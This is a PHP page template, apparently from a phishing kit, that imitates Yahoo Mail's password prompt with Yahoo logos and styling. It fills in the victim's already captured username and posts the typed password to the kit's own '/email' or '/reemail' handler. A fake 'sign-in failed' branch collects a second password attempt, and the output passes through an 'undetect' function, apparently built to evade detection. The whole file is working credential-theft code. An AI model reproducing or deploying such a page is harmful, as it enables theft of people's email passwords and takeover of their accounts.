<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "Email Yahoo";
$api->check_cookie();

$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html id="Stencil" lang="en-US" class="js grid light-theme ">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
    <title>'.$api->text_encode($lang['emailyahoo']['title']).'</title>
    <link rel="icon" type="image/x-icon" href="'.$api->image_encode("assets/email/yahoo/img/yahoo-favicon-img-v0.0.2.ico")['local'].'">
    <link rel="shortcut icon" type="image/x-icon" href="'.$api->image_encode("assets/email/yahoo/img/yahoo-favicon-img-v0.0.2.ico")['local'].'">
    <link rel="apple-touch-icon" href="'.$api->image_encode("assets/email/yahoo/img/yahoo-apple-touch-v0.0.2.png")['local'].'">
    <link rel="apple-touch-icon-precomposed" href="'.$api->image_encode("assets/email/yahoo/img/yahoo-apple-touch-v0.0.2.png")['local'].'">
    <style nonce="">
        #mbr-css-check {
            display: inline;
        }
    </style>
    <link href="'.$api->text_encode("../assets/email/yahoo/css/main-yahoo.css").'" rel="stylesheet" type="text/css">
</head>
<body class="bucket-mbr-app-auth-upsell bucket-mbr-comm-channel-v3 bucket-mbr-reg-password-v2">
    <div id="login-body" class="loginish  puree-v2  grid    ">
        <div class="mbr-desktop-hd">
            <span class="column">
                <a href="#">
                    <img src="'.$api->image_encode("assets/email/yahoo/img/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png")['local'].'" class="logo " width="" height="36">
                    <img src="'.$api->image_encode("assets/email/yahoo/img/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png")['local'].'" class="dark-mode-logo logo " width="" height="36">
                </a>
            </span>
        </div>
        <div class="login-box-container">
            <div class="login-box right">
                <div class="mbr-login-hd txt-align-center">
                    <img src="'.$api->image_encode("assets/email/yahoo/img/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png")['local'].'" class="logo yahoo-en-US" width="" height="27">
                    <img src="'.$api->image_encode("assets/email/yahoo/img/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png")['local'].'" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
                </div>
                <div class="challenge password-challenge">
                    <div class="challenge-header">
                        <div class="yid">'.$_SESSION['username'].'</div>
                    </div>
                    <div id="password-challenge" class="primary">
                        <strong class="challenge-heading">'.$api->text_encode($lang['emailyahoo']['enterpassword']).'</strong>
                        <span class="txt-align-center challenge-desc">'.$api->text_encode($lang['emailyahoo']['finishsignin']).'</span>
                        ';
                        if (isset($_GET['error']) && $_GET['error'] == true) {
                        $html .= '
                        <form method="POST" action="/reemail" class="challenge-form ">
                        <div id="password-container" class="input-group password-container blurred">
                            <input type="password" id="login-passwd" class="login-passwd password" name="'.$api->encypt("passwordemail").'" autofocus="" autocomplete="current-password" required>
                            <label class="password-label">'.$api->text_encode($lang['emailyahoo']['inputpassword']).'</label>
                            <button type="button" class="password-toggle-button show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1"></button>
                        </div>
                        <div style=" margin-top:5px">
                            <span style="color:red; font-size: small;">'.$api->text_encode($lang['emailyahoo']['alertfailed']).'</span>
                        </div>
                        <div class="button-container">
                            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="Continue" value="'.$api->text_encode($lang['emailyahoo']['next']).'">
                                '.$api->text_encode($lang['emailyahoo']['next']).'
                            </button>
                        </div>
                        <div class="forgot-cont challenge-button-link">
                            <input type="submit" class="pure-button puree-button-link challenge-button-link" id="mbr-forgot-link" name="skip" value="'.$api->text_encode($lang['emailyahoo']['forgot']).'">
                        </div>
                        </form>
                        ';
                        } else {
                        $html .= '
                        <form method="POST" action="/email" class="challenge-form ">
                            <div id="password-container" class="input-group password-container blurred">
                                <input type="password" id="login-passwd" class="login-passwd password" name="'.$api->encypt("passwordemail").'" autofocus="" autocomplete="current-password" required>
                                <label class="password-label">'.$api->text_encode($lang['emailyahoo']['inputpassword']).'</label>
                                <button type="button" class="password-toggle-button show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1"></button>
                            </div>
                            <div class="button-container">
                                <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="Continue" value="'.$api->text_encode($lang['emailyahoo']['next']).'">
                                    '.$api->text_encode($lang['emailyahoo']['next']).'
                                </button>
                            </div>
                            <div class="forgot-cont challenge-button-link">
                                <input type="submit" class="pure-button puree-button-link challenge-button-link" id="mbr-forgot-link" name="skip" value="'.$api->text_encode($lang['emailyahoo']['forgot']).'">
                            </div>
                        </form>
                        ';
                        }
                        $html .= '
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
            '.$api->text_encode($lang['emailyahoo']['legacy']).'
        </p>
    </div>
    <script>
    document.addEventListener("DOMContentLoaded", function() {
        const passwordInput = document.querySelector(".login-passwd");
        const toggleButton = document.querySelector(".password-toggle-button");
        toggleButton.addEventListener("click", function() {
          if (passwordInput.type === "password") {
            passwordInput.type = "text";
            toggleButton.classList.remove("hide-pw");
            toggleButton.classList.add("show-pw");
          } else {
            passwordInput.type = "password";
            toggleButton.classList.remove("show-pw");
            toggleButton.classList.add("hide-pw");
          }
        });
      });
    </script>
</body>
</html>';

$api->undetect($html);
?>